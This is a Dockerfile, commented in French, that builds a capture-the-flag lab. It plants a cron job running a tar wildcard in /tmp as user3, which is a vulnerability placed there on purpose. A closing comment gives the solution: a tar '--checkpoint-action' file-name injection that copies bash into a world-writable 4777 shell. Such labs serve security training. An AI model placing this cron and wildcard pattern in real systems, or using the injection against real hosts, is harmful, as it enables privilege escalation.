FROM ctf:latest
ARG SSH_PASS
ARG FLAG

RUN echo "ctf:${SSH_PASS}" | chpasswd

# MaJ de sudo
RUN apt-get update && apt-get install -y sudo 


# Création des utilisateurs 
RUN useradd -m -s /bin/bash user3 

# Définition du répertoire personnel pour chaque utilisateur 
RUN usermod -d /home/user3 user3 

# Changement du propriétaire des répertoires personnels 
RUN chown user3:user3 /home/user3 

# Changement des permissions sur les répertoires personnels 
RUN chmod 700 /home/user3

#Ajout des différents flags dans les home directory de nos 3 utilisateurs
RUN echo $FLAG > /home/user3/flag3.txt

# Ajout de la vuln num 3 : Une tâche cron qui s'exécute avec les droits user3 run /etc/script.sh toutes les min.
# Sauf que /etc/script.sh exécute une commande dans un répertoire qui n'existe pas. Il va falloir que l'utilisateur créé le fichier et faire en sorte que le script run le 
# payload par lui meme
RUN echo '#!/bin/bash\n\
cd /tmp/abcd\n\
tar -cf /dev/null /dev/null *\n\
rm -rf /tmp/abcd' > /etc/script.sh && chown user3:user3 /etc/script.sh

# Donner les droits sur le script 
RUN chmod 504 /etc/script.sh 

# Créer la tâche cron qui exécute le script.sh toutes les min
RUN echo "*/1 * * * * user3 /etc/script.sh" > /etc/crontab


#SOLUTION : 
# echo '/usr/bin/cp /bin/bash /tmp/mybash && chmod 4777 /tmp/mybash' > exploit.sh  && echo '' > '--checkpoint=1' && echo '' > '--checkpoint-action=exec=sh exploit.sh' && chmod 777 /tmp/abcd/*